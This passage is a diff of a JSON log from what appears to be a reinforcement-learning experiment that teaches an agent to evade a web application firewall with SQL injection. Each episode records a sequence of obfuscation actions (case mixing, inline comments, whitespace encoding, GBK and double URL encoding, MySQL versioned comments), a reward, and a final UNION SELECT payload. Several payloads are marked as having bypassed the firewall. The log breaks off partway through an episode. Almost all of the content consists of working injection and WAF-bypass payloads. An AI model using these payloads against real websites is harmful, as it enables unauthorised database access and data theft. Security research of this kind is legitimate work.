+      "concat_char",
+      "ver_newline",
+      "hash_nl",
       "comment",
       "newline",
       "comment",
+      "comment",
       "newline",
+      "comment",
       "newline",
-      "newline",
+      "comment",
       "tab_space",
-      "comment"
+      "comment",
+      "comment",
+      "newline"
     ],
-    "final_payload": "0'%252f%252a*//*U*//*N*//*I*//*O*//*N*/%252f%252a*//*S*//*E*//*L*//*E*//*C*//*T*/%252f%252a*/1,2,3;%00"
+    "final_payload": "0'/**/%0A/*!50000%55NION*/%09/*!%53ELECT*/%0A/**/1,2,3;%00"
   },
   {
     "episode": 84,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
+    "steps": 3,
+    "total_reward": 5.52,
+    "success": true,
+    "final_result": "SUCCESS",
     "sequence": [
-      "convert_charset",
+      "unhex_wrap",
       "newline",
-      "double_encode",
-      "comment",
-      "plus_sep",
-      "tab_space",
-      "newline",
-      "newline",
-      "tab_space",
-      "comment",
-      "vtab",
-      "comment",
-      "vtab",
-      "comment",
-      "formfeed"
+      "case"
     ],
-    "final_payload": "0'%0aUNION%0aSELECT%0a1,2,3;%00"
+    "final_payload": "0'%0auNION%0aSELeCT%0a1,2,3;%00"
   },
   {
     "episode": 85,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
+    "steps": 5,
+    "total_reward": 0.8,
+    "success": true,
+    "final_result": "SUCCESS",
     "sequence": [
-      "distinct",
-      "comment",
-      "comment",
-      "comment",
-      "newline",
-      "plus_sep",
-      "plus_sep",
-      "comment",
+      "convert_charset",
       "tab_space",
+      "vtab",
       "comment",
-      "newline",
-      "comment",
-      "comment",
-      "newline",
-      "hash_nl_all"
+      "case"
     ],
-    "final_payload": "0'/**/UNION/**/DISTINCTROW/**/SELECT/**/1,2,3;%00"
+    "final_payload": "0'%09uNioN%09SELECt%091,2,3;%00"
   },
   {
     "episode": 86,
@@ -2109,23 +2087,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "gbk_bypass",
-      "newline",
-      "hash_nl",
+      "distinct",
+      "between_space",
       "comment",
       "comment",
       "newline",
+      "scientific",
+      "ver_12345",
+      "comment",
       "comment",
       "comment",
       "newline",
-      "comment",
-      "comment",
-      "newline",
+      "hex_encode",
       "comment",
       "comment",
       "newline"
     ],
-    "final_payload": "0%bf%27%0aUNION%23xyz%0ASELECT%0a1,2,3;%00"
+    "final_payload": "0'%a0UNION%a0DISTINCT%a0SELECT%a01e0,2e0,3e0;%00"
   },
   {
     "episode": 87,
@@ -2134,23 +2112,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "nested_or",
-      "tab_space",
-      "double_and",
-      "newline",
-      "tab_space",
-      "tab_space",
-      "newline",
-      "tab_space",
-      "param_pollute",
+      "gbk_bypass",
+      "url_mid_char",
       "comment",
       "newline",
       "comment",
-      "newline",
+      "tab_space",
+      "between_space",
       "comment",
-      "tab_space"
+      "comment",
+      "comment",
+      "crlf",
+      "comment",
+      "comment",
+      "newline",
+      "comment"
     ],
-    "final_payload": "0'%09UNION/*&q=*/SELECT/*&q=*/1,2,3;%00"
+    "final_payload": "0%bf%27/**/UN%49ON/**/SEL%45CT/**/1,2,3;%00"
   },
   {
     "episode": 88,
@@ -2160,34 +2138,47 @@
     "final_result": "WAF_BLOCKED",
     "sequence": [
       "dbl_url_comment",
-      "tab_space",
-      "between_space",
       "newline",
-      "crlf",
-      "tab_space",
-      "tab_space",
-      "crlf",
-      "nested_and",
+      "gbk_bypass",
       "comment",
-      "vtab",
-      "distinct",
+      "hash_nl",
       "comment",
-      "formfeed",
-      "ver_00000"
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment"
     ],
-    "final_payload": "0'%09/*!00000UNION*/%09ALL%09/*!00000SELECT*/%091,2,3;%00"
+    "final_payload": "0%bf%27%0aUNION%23xyz%0ASELECT%0a1,2,3;%00"
   },
   {
     "episode": 89,
-    "steps": 2,
-    "total_reward": 7.76,
-    "success": true,
-    "final_result": "SUCCESS",
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
     "sequence": [
+      "comment",
+      "ver_50000",
+      "comment",
+      "comment",
       "newline",
-      "case"
+      "comment",
+      "double_and",
+      "nested_or",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "tab_space",
+      "comment",
+      "plus_sep"
     ],
-    "final_payload": "0'%0aUNIon%0aSELECt%0a1,2,3;%00"
+    "final_payload": "0'/**//*!40100UNION*//**//*!40100SELECT*//**/1,2,3;%00"
   },
   {
     "episode": 90,
@@ -2196,23 +2187,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "between_space",
-      "crlf",
-      "comment",
-      "crlf",
-      "nested_or",
-      "newline",
-      "crlf",
-      "crlf",
-      "newline",
-      "double_and",
-      "comment",
-      "crlf",
+      "tab_space",
       "formfeed",
-      "paren_full",
-      "comment"
+      "paren_space",
+      "case_split",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "hash_nl_all",
+      "nested_union",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "tab_space"
     ],
-    "final_payload": "0'%a0UNION%a0SELECT%a01,2,3;%00"
+    "final_payload": "0'%09uNion(SeLeCt/**/(1),(2),(3;%00))"
   },
   {
     "episode": 91,
@@ -2221,23 +2212,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "plus_sep",
-      "ver_newline",
-      "hash_nl_all",
+      "vtab",
+      "newline",
+      "keyword_split",
       "comment",
       "comment",
-      "formfeed",
+      "newline",
+      "paren_full",
       "comment",
-      "tab_space",
       "comment",
       "newline",
       "comment",
-      "crlf",
-      "newline",
-      "newline",
-      "tab_space"
+      "scientific",
+      "comment",
+      "comment",
+      "newline"
     ],
-    "final_payload": "0'+%0A/*!50000%55NION*/+/*!%53ELECT*/%0A+1,2,3;%00"
+    "final_payload": "0'%0bUN/**/ION%0bSEL/**/ECT%0b1,2,3;%00"
   },
   {
     "episode": 92,
@@ -2246,23 +2237,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "hash_nl_all",
+      "formfeed",
+      "newline",
+      "newline",
       "crlf",
-      "comment",
-      "between_space",
-      "comment",
-      "plus_sep",
-      "tab_space",
-      "comment",
       "tab_space",
       "comment",
       "vtab",
+      "newline",
+      "comment",
+      "formfeed",
+      "comment",
+      "keyword_split",
       "comment",
       "tab_space",
-      "tab_space",
-      "crlf"
+      "comment"
     ],
-    "final_payload": "0'%23xx%0AUNION%23xx%0ASELECT%23xx%0A1,2,3;%00"
+    "final_payload": "0'%0cUN/**/ION%0cSEL/**/ECT%0c1,2,3;%00"
   },
   {
     "episode": 93,
@@ -2271,72 +2262,85 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "double_encode",
-      "tab_space",
-      "comment",
-      "formfeed",
-      "comment",
-      "plus_sep",
+      "between_space",
+      "newline",
       "comment",
       "tab_space",
+      "between_space",
       "comment",
       "tab_space",
+      "comment",
       "crlf",
       "comment",
-      "tab_space",
-      "vtab",
-      "comment"
+      "newline",
+      "comment",
+      "newline",
+      "comment",
+      "tab_space"
     ],
-    "final_payload": "0'%2520UNION%2520SELECT%25201,2,3;%00"
+    "final_payload": "0'%a0UNION%a0SELECT%a01,2,3;%00"
   },
   {
     "episode": 94,
-    "steps": 2,
-    "total_reward": 7.76,
-    "success": true,
-    "final_result": "SUCCESS",
-    "sequence": [
-      "case",
-      "newline"
-    ],
-    "final_payload": "0'%0aUNIoN%0asElecT%0a1,2,3;%00"
-  },
-  {
-    "episode": 95,
     "steps": 15,
     "total_reward": -39.6,
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
+      "plus_sep",
       "formfeed",
-      "newline",
-      "tab_space",
-      "crlf",
-      "crlf",
-      "vtab",
-      "tab_space",
+      "comment",
+      "formfeed",
+      "comment",
+      "nested_and",
       "between_space",
-      "hex_encode",
-      "unhex_wrap",
       "comment",
+      "tab_space",
+      "nested_and",
+      "case",
       "comment",
+      "between_space",
       "comment",
-      "newline",
-      "plus_sep"
+      "hash_nl"
     ],
-    "final_payload": "0'%0cUNION%0cSELECT%0c0x31,0x32,0x33;%00"
+    "final_payload": "0'+unION+sELecT+1,2,3;%00"
   },
   {
-    "episode": 96,
+    "episode": 95,
     "steps": 2,
     "total_reward": 7.76,
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
-      "case_split",
+      "newline",
+      "case"
+    ],
+    "final_payload": "0'%0aUNioN%0aseLEcT%0a1,2,3;%00"
+  },
+  {
+    "episode": 96,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "double_encode",
+      "paren_full",
+      "tab_space",
+      "comment",
+      "between_space",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf",
+      "newline",
       "newline"
     ],
-    "final_payload": "0'%0auNiOn%0asElEcT%0a1,2,3;%00"
+    "final_payload": "0'%2520UNION%2520SELECT%25201,2,3;%00"
   },
   {
     "episode": 97,
@@ -2345,23 +2349,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "url_encode",
-      "tab_space",
+      "param_pollute",
+      "char_split",
       "comment",
       "comment",
       "newline",
+      "newline",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "plus_sep",
+      "comment",
       "comment",
       "paren_space",
-      "comment",
-      "nested_and",
-      "comment",
-      "nested_and",
-      "newline",
-      "hash_nl_all",
-      "comment",
       "comment"
     ],
-    "final_payload": "0'%09%55NION%09%53ELECT%091,2,3;%00"
+    "final_payload": "0'%0a/*U*//*N*//*I*//*O*//*N*//*&q=*//*S*//*E*//*L*//*E*//*C*//*T*//*&q=*/1,2,3;%00"
   },
   {
     "episode": 98,
@@ -2370,48 +2374,35 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "url_mid_char",
-      "tab_space",
+      "case",
       "plus_sep",
-      "ver_newline",
+      "plus_sep",
       "comment",
-      "case_split",
+      "plus_sep",
+      "newline",
       "comment",
-      "double_encode",
-      "double_or",
+      "paren_full",
       "comment",
-      "formfeed",
-      "tab_space",
+      "crlf",
       "newline",
       "crlf",
-      "newline"
+      "tab_space",
+      "vtab",
+      "ver_12345"
     ],
-    "final_payload": "0'%09UN%49ON%09SEL%45CT%091,2,3;%00"
+    "final_payload": "0'+UNIOn+SELecT+1,2,3;%00"
   },
   {
     "episode": 99,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
     "sequence": [
-      "keyword_split",
-      "newline",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "newline",
-      "comment"
+      "case_split",
+      "newline"
     ],
-    "final_payload": "0'%0aUN/**/ION%0aSEL/**/ECT%0a1,2,3;%00"
+    "final_payload": "0'%0auNIon%0aselECT%0a1,2,3;%00"
   },
   {
     "episode": 100,
@@ -2420,23 +2411,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "backtick",
+      "char_split",
       "tab_space",
-      "double_encode",
+      "between_space",
       "comment",
-      "url_encode",
+      "tab_space",
+      "tab_space",
+      "vtab",
+      "plus_sep",
       "comment",
-      "newline",
+      "unhex_wrap",
       "comment",
-      "ver_12345",
+      "between_space",
       "comment",
-      "comment",
-      "paren_space",
-      "comment",
-      "paren_full",
+      "vtab",
       "comment"
     ],
-    "final_payload": "0'%09`%55NION`%09`%53ELECT`%091,2,3;%00"
+    "final_payload": "0'%09/*U*//*N*//*I*//*O*//*N*/%09/*S*//*E*//*L*//*E*//*C*//*T*/%091,2,3;%00"
   },
   {
     "episode": 101,
@@ -2445,23 +2436,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "char_split",
-      "newline",
-      "case",
+      "ver_50000",
+      "dbl_url_comment",
+      "ver_urlenc",
       "comment",
-      "double_encode",
-      "newline",
-      "crlf",
-      "tab_space",
-      "tab_space",
-      "keyword_split",
+      "hash_nl_all",
       "comment",
-      "between_space",
+      "formfeed",
       "comment",
-      "between_space",
-      "newline"
+      "comment",
+      "comment",
+      "formfeed",
+      "comment",
+      "hash_nl_all",
+      "comment",
+      "comment"
     ],
-    "final_payload": "0'%0a/*U*//*N*//*I*//*O*//*N*/%0a/*S*//*E*//*L*//*E*//*C*//*T*/%0a1,2,3;%00"
+    "final_payload": "0'%23zz%0A/*!50000UNION*/%23zz%0A/*!50000SELECT*/%23zz%0A1,2,3;%00"
   },
   {
     "episode": 102,
@@ -2470,23 +2461,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "ver_50000",
+      "ver_00000",
+      "tab_space",
+      "keyword_split",
+      "comment",
+      "comment",
       "newline",
       "comment",
       "comment",
+      "unhex_wrap",
+      "nested_or",
+      "comment",
+      "comment",
+      "comment",
       "newline",
-      "comment",
-      "tab_space",
-      "comment",
-      "crlf",
-      "comment",
-      "tab_space",
-      "comment",
-      "vtab",
-      "comment",
-      "formfeed"
+      "comment"
     ],
-    "final_payload": "0'%0a/*!50001UNION*/%0a/*!50001SELECT*/%0a1,2,3;%00"
+    "final_payload": "0'%09/*!00000UN/**/ION*/%09/*!00000SEL/**/ECT*/%091,2,3;%00"
   },
   {
     "episode": 103,
@@ -2495,23 +2486,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "ver_00000",
-      "newline",
-      "newline",
-      "newline",
+      "ver_urlenc",
       "tab_space",
       "comment",
-      "convert_charset",
       "comment",
-      "vtab",
-      "comment",
-      "crlf",
       "newline",
+      "hash_nl_all",
+      "comment",
+      "comment",
+      "newline",
+      "comment",
       "tab_space",
-      "newline",
+      "comment",
+      "tab_space",
+      "comment",
       "crlf"
     ],
-    "final_payload": "0'%0a/*!00000UNION*/%0a/*!00000SELECT*/%0a1,2,3;%00"
+    "final_payload": "0'%09/*!50000%55NION*/%09/*!50000%53ELECT*/%091,2,3;%00"
   },
   {
     "episode": 104,
@@ -2520,23 +2511,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "ver_12345",
-      "newline",
-      "paren_space",
+      "ver_newline",
+      "tab_space",
       "comment",
-      "tab_space",
+      "comment",
       "newline",
-      "tab_space",
+      "comment",
+      "comment",
       "newline",
-      "crlf",
-      "tab_space",
+      "comment",
+      "comment",
       "newline",
-      "tab_space",
-      "tab_space",
-      "crlf",
-      "backtick"
+      "comment",
+      "comment",
+      "newline",
+      "comment"
     ],
-    "final_payload": "0'%0a/*!12345`UNION`%0a`SELECT`*/%0a1,2,3;%00"
+    "final_payload": "0'%09%0A/*!50000%55NION*/%09/*!%53ELECT*/%0A%091,2,3;%00"
   },
   {
     "episode": 105,
@@ -2545,23 +2536,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "ver_urlenc",
-      "gbk_bypass",
+      "distinct",
+      "newline",
       "comment",
       "comment",
       "newline",
+      "comment",
       "comment",
       "nested_or",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
+      "nested_or",
+      "vtab",
+      "concat_char",
       "comment",
       "newline",
+      "comment",
       "comment"
     ],
-    "final_payload": "0%bf%27%0a/*!50001%55NION*/%0a/*!50001%53ELECT*/%0a1,2,3;%00"
+    "final_payload": "0'%0aUNION%0aDISTINCT%0aSELECT%0a1,2,3;%00"
   },
   {
     "episode": 106,
@@ -2570,48 +2561,48 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "hex_encode",
-      "comment",
-      "gbk_bypass",
-      "comment",
-      "comment",
+      "paren_space",
       "newline",
       "comment",
-      "formfeed",
-      "plus_sep",
+      "ver_00000",
+      "comment",
       "comment",
       "comment",
       "newline",
       "comment",
       "comment",
-      "hash_nl_all"
+      "newline",
+      "ver_00000",
+      "comment",
+      "comment",
+      "newline"
     ],
-    "final_payload": "0%bf%27/**/UNION/**/SELECT/**/0x31,0x32,0x33;%00"
+    "final_payload": "0'%0a/*!00000UNION*/(/*!00000SELECT*/%0a(1),(2),(3;%00))"
   },
   {
     "episode": 107,
     "steps": 15,
-    "total_reward": -39.6,
+    "total_reward": -29.6,
     "success": false,
-    "final_result": "WAF_BLOCKED",
+    "final_result": "SQL_ERROR",
     "sequence": [
-      "ver_newline",
-      "tab_space",
-      "comment",
+      "paren_full",
       "crlf",
-      "comment",
-      "comment",
-      "comment",
+      "tab_space",
+      "tab_space",
+      "crlf",
+      "tab_space",
       "newline",
+      "backtick",
+      "comment",
+      "double_encode",
+      "comment",
+      "case",
       "comment",
       "comment",
-      "newline",
-      "comment",
-      "comment",
-      "ver_newline",
-      "comment"
+      "newline"
     ],
-    "final_payload": "0'%09%0A/*!50000%55NION*/%09/*!%53ELECT*/%0A%091,2,3;%00"
+    "final_payload": "0'%0d%0a`uNIOn`%0d%0a`sElECt`%0d%0a1,2,3;%00"
   },
   {
     "episode": 108,
@@ -2620,48 +2611,39 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "paren_space",
+      "hash_nl",
+      "tab_space",
+      "comment",
+      "between_space",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
+      "char_split",
+      "comment",
       "newline",
       "comment",
-      "gbk_bypass",
-      "comment",
-      "nested_or",
-      "comment",
       "comment",
       "newline",
-      "comment",
-      "comment",
-      "vtab",
-      "comment",
-      "scientific",
-      "ver_newline"
+      "comment"
     ],
-    "final_payload": "0%bf%27%0a%0A/*!50000%55NION*/(/*!%53ELECT*/%0A%0a(1),(2),(3;%00))"
+    "final_payload": "0'%09/*U*//*N*//*I*//*O*//*N*/%23sqli%0A/*S*//*E*//*L*//*E*//*C*//*T*/%091,2,3;%00"
   },
   {
     "episode": 109,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
+    "steps": 6,
+    "total_reward": -1.68,
+    "success": true,
+    "final_result": "SUCCESS",
     "sequence": [
-      "paren_full",
-      "comment",
-      "ver_50000",
-      "comment",
+      "nested_and",
       "tab_space",
+      "plus_sep",
+      "dbl_url_comment",
       "comment",
-      "comment",
-      "newline",
-      "paren_space",
-      "comment",
-      "comment",
-      "newline",
-      "url_mid_char",
-      "comment",
-      "comment"
+      "case"
     ],
-    "final_payload": "0'/**//*!50100UN%49ON*//**//*!50100SEL%45CT*//**/1,2,3;%00"
+    "final_payload": "0'%09UniOn%09SeLeCt%091,2,3;%00"
   },
   {
     "episode": 110,
@@ -2670,23 +2652,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "hash_nl",
+      "nested_union",
       "formfeed",
+      "comment",
+      "comment",
+      "distinct",
       "comment",
       "comment",
       "newline",
       "comment",
-      "tab_space",
       "comment",
-      "crlf",
+      "newline",
+      "hash_nl_all",
       "comment",
       "formfeed",
-      "plus_sep",
-      "comment",
-      "comment",
-      "newline"
+      "comment"
     ],
-    "final_payload": "0'%0cUNION%23xyz%0ASELECT%0c1,2,3;%00"
+    "final_payload": "0'%0cUNIunionON%0cSELselectECT%0c1,2,3;%00"
   },
   {
     "episode": 111,
@@ -2695,23 +2677,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "param_pollute",
+      "double_or",
+      "backtick",
+      "crlf",
+      "crlf",
+      "vtab",
       "newline",
+      "hash_nl",
       "comment",
-      "formfeed",
-      "comment",
-      "comment",
+      "between_space",
+      "crlf",
+      "newline",
+      "newline",
+      "vtab",
       "tab_space",
-      "comment",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "newline",
       "comment"
     ],
-    "final_payload": "0'%0aUNION/*&a=*/SELECT/*&a=*/1,2,3;%00"
+    "final_payload": "0'%0d%0a`UNION`%0d%0a`SELECT`%0d%0a1,2,3;%00"
   },
   {
     "episode": 112,
@@ -2720,23 +2702,23 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "nested_and",
-      "crlf",
-      "crlf",
-      "newline",
-      "plus_sep",
-      "crlf",
-      "crlf",
+      "double_and",
+      "tab_space",
+      "double_encode",
+      "comment",
+      "dbl_url_comment",
       "vtab",
-      "char_split",
-      "url_encode",
+      "tab_space",
+      "formfeed",
       "comment",
       "plus_sep",
+      "hash_nl_all",
+      "paren_full",
       "comment",
-      "plus_sep",
-      "formfeed"
+      "formfeed",
+      "comment"
     ],
-    "final_payload": "0'%0d%0a/*U*//*N*//*I*//*O*//*N*/%0d%0a/*S*//*E*//*L*//*E*//*C*//*T*/%0d%0a1,2,3;%00"
+    "final_payload": "0'%09UNION%09SELECT%091,2,3;%00"
   },
   {
     "episode": 113,
@@ -2745,36 +2727,48 @@
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
-      "nested_union",
-      "tab_space",
+      "hex_encode",
+      "hash_nl_all",
+      "comment",
+      "comment",
+      "distinct",
       "comment",
       "comment",
       "newline",
       "comment",
       "comment",
       "newline",
-      "comment",
       "vtab",
-      "comment",
-      "comment",
       "comment",
       "dbl_url_comment",
       "comment"
     ],
-    "final_payload": "0'%09UNIunionON%09SELselectECT%091,2,3;%00"
+    "final_payload": "0'%23zz%0AUNION%23zz%0ASELECT%23zz%0A0x31,0x32,0x33;%00"
   },
   {
     "episode": 114,
-    "steps": 3,
-    "total_reward": 5.52,
-    "success": true,
-    "final_result": "SUCCESS",
+    "steps": 15,
+    "total_reward": -14.6,
+    "success": false,
+    "final_result": "SQL_ERROR",
     "sequence": [
-      "double_or",
+      "backtick",
+      "vtab",
+      "tab_space",
+      "nested_or",
+      "comment",
+      "case",
+      "comment",
+      "comment",
       "newline",
-      "case"
+      "comment",
+      "comment",
+      "newline",
+      "comment",
+      "hex_encode",
+      "comment"
     ],
-    "final_payload": "0'%0auNIoN%0aselECT%0a1,2,3;%00"
+    "final_payload": "0'%0b`uNiON`%0b`sElEct`%0b1,2,3;%00"
   },
   {
     "episode": 115,
@@ -2784,35 +2778,47 @@
     "final_result": "WAF_BLOCKED",
     "sequence": [
       "scientific",
-      "between_space",
-      "vtab",
       "comment",
-      "vtab",
-      "hex_encode",
+      "ver_00000",
+      "newline",
+      "newline",
+      "tab_space",
+      "comment",
+      "tab_space",
+      "newline",
+      "newline",
+      "tab_space",
       "comment",
       "crlf",
-      "tab_space",
-      "newline",
-      "newline",
-      "tab_space",
-      "comment",
-      "tab_space",
-      "nested_union"
+      "crlf",
+      "comment"
     ],
-    "final_payload": "0'%a0UNIunionON%a0SELselectECT%a01e0,2e0,3e0;%00"
+    "final_payload": "0'/**//*!00000UNION*//**//*!00000SELECT*//**/1e0,2e0,3e0;%00"
   },
   {
     "episode": 116,
-    "steps": 3,
-    "total_reward": 5.52,
-    "success": true,
-    "final_result": "SUCCESS",
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
     "sequence": [
-      "concat_char",
+      "newline",
       "tab_space",
-      "case"
+      "newline",
+      "ver_00000",
+      "comment",
+      "paren_full",
+      "newline",
+      "crlf",
+      "comment",
+      "tab_space",
+      "newline",
+      "comment",
+      "vtab",
+      "comment",
+      "formfeed"
     ],
-    "final_payload": "0'%09uNIoN%09SEleCt%091,2,3;%00"
+    "final_payload": "0'%0a/*!00000UNION*/%0a/*!00000SELECT*/%0a1,2,3;%00"
   },
   {
     "episode": 117,
@@ -2821,74 +2827,74 @@
     "success": true,
     "final_result": "SUCCESS",
     "sequence": [
-      "unhex_wrap",
+      "concat_char",
       "newline",
       "case"
     ],
-    "final_payload": "0'%0auniON%0aseLect%0a1,2,3;%00"
+    "final_payload": "0'%0aUniOn%0asELeCt%0a1,2,3;%00"
   },
   {
     "episode": 118,
+    "steps": 15,
+    "total_reward": -27.1,
+    "success": false,
+    "final_result": "SQL_ERROR",
+    "sequence": [
+      "crlf",
+      "crlf",
+      "vtab",
+      "formfeed",
+      "tab_space",
+      "vtab",
+      "tab_space",
+      "tab_space",
+      "backtick",
+      "comment",
+      "case_split",
+      "comment",
+      "tab_space",
+      "comment",
+      "crlf"
+    ],
+    "final_payload": "0'%0d%0a`uNIon`%0d%0a`selECT`%0d%0a1,2,3;%00"
+  },
+  {
+    "episode": 119,
+    "steps": 3,
+    "total_reward": 5.52,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "unhex_wrap",
+      "tab_space",
+      "case"
+    ],
+    "final_payload": "0'%09uNIOn%09sELect%091,2,3;%00"
+  },
+  {
+    "episode": 120,
     "steps": 15,
     "total_reward": -39.6,
     "success": false,
     "final_result": "WAF_BLOCKED",
     "sequence": [
       "convert_charset",
-      "nested_and",
-      "vtab",
-      "tab_space",
-      "vtab",
-      "newline",
       "crlf",
-      "tab_space",
-      "vtab",
-      "comment",
+      "formfeed",
+      "crlf",
+      "hash_nl_all",
       "between_space",
       "tab_space",
-      "tab_space",
       "crlf",
-      "tab_space"
-    ],
-    "final_payload": "0'%0bUNION%0bSELECT%0b1,2,3;%00"
-  },
-  {
-    "episode": 119,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
-    "sequence": [
-      "comment",
-      "ver_00000",
-      "comment",
       "crlf",
-      "comment",
-      "vtab",
-      "comment",
       "tab_space",
       "vtab",
-      "comment",
-      "tab_space",
-      "comment",
+      "double_or",
       "newline",
-      "paren_full",
+      "paren_space",
       "comment"
     ],
-    "final_payload": "0'/**//*!00000UNION*//**//*!00000SELECT*//**/1,2,3;%00"
-  },
-  {
-    "episode": 120,
-    "steps": 3,
-    "total_reward": 5.52,
-    "success": true,
-    "final_result": "SUCCESS",
-    "sequence": [
-      "distinct",
-      "newline",
-      "case"
-    ],
-    "final_payload": "0'%0aUNiON%0aALL%0asELeCT%0a1,2,3;%00"
+    "final_payload": "0'%0d%0aUNION(SELECT/**/(1),(2),(3;%00))"
   },
   {
     "episode": 121,
@@ -2898,72 +2904,50 @@
     "final_result": "WAF_BLOCKED",
     "sequence": [
       "gbk_bypass",
-      "tab_space",
       "comment",
+      "ver_00000",
+      "paren_space",
       "comment",
-      "newline",
-      "nested_or",
-      "plus_sep",
-      "comment",
-      "comment",
-      "comment",
-      "newline",
-      "comment",
-      "comment",
-      "between_space",
-      "comment"
-    ],
-    "final_payload": "0%bf%27%09UNION%09SELECT%091,2,3;%00"
-  },
-  {
-    "episode": 122,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
-    "sequence": [
-      "dbl_url_comment",
-      "crlf",
+      "formfeed",
       "vtab",
-      "nested_union",
+      "comment",
+      "comment",
+      "comment",
+      "newline",
       "comment",
       "comment",
       "hash_nl_all",
-      "comment",
-      "tab_space",
-      "comment",
-      "comment",
-      "ver_newline",
-      "comment",
-      "tab_space",
-      "crlf"
+      "comment"
     ],
-    "final_payload": "0'%0d%0aUNI%0A/*!50000%55nion*/ON%0d%0aSEL/*!%53elect*/%0AECT%0d%0a1,2,3;%00"
+    "final_payload": "0%bf%27/**//*!00000UNION*//**//*!00000SELECT*//**/1,2,3;%00"
+  },
+  {
+    "episode": 122,
+    "steps": 3,
+    "total_reward": 5.52,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "dbl_url_comment",
+      "tab_space",
+      "case"
+    ],
+    "final_payload": "0'%09UnION%09SelECT%091,2,3;%00"
   },
   {
     "episode": 123,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
+    "steps": 5,
+    "total_reward": 0.8,
+    "success": true,
+    "final_result": "SUCCESS",
     "sequence": [
-      "nested_union",
       "crlf",
-      "paren_full",
+      "hash_nl_all",
+      "convert_charset",
       "comment",
-      "newline",
-      "comment",
-      "crlf",
-      "comment",
-      "vtab",
-      "comment",
-      "newline",
-      "comment",
-      "unhex_wrap",
-      "comment",
-      "tab_space"
+      "case"
     ],
-    "final_payload": "0'%0d%0aUNIunionON%0d%0aSELselectECT%0d%0a1,2,3;%00"
+    "final_payload": "0'%0d%0aunIOn%0d%0aSeLect%0d%0a1,2,3;%00"
   },
   {
     "episode": 124,
@@ -2973,9 +2957,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aUnioN%0aSelEct%0a1,2,3;%00"
+    "final_payload": "0'%0cunIon%0csElECt%0c1,2,3;%00"
   },
   {
     "episode": 125,
@@ -2985,9 +2969,9 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0auniON%0aSEleCt%0a1,2,3;%00"
+    "final_payload": "0'%0cUnioN%0cSELeCt%0c1,2,3;%00"
   },
   {
     "episode": 126,
@@ -2997,46 +2981,35 @@
     "final_result": "SUCCESS",
     "sequence": [
       "case",
-      "newline"
+      "formfeed"
     ],
-    "final_payload": "0'%0aunIoN%0asELeCT%0a1,2,3;%00"
+    "final_payload": "0'%0cUniON%0cSeLect%0c1,2,3;%00"
   },
   {
     "episode": 127,
-    "steps": 15,
-    "total_reward": -39.6,
-    "success": false,
-    "final_result": "WAF_BLOCKED",
-    "sequence": [
-      "case",
-      "ver_00000",
-      "comment",
-      "double_encode",
-      "comment",
-      "case",
-      "newline",
-      "tab_space",
-      "crlf",
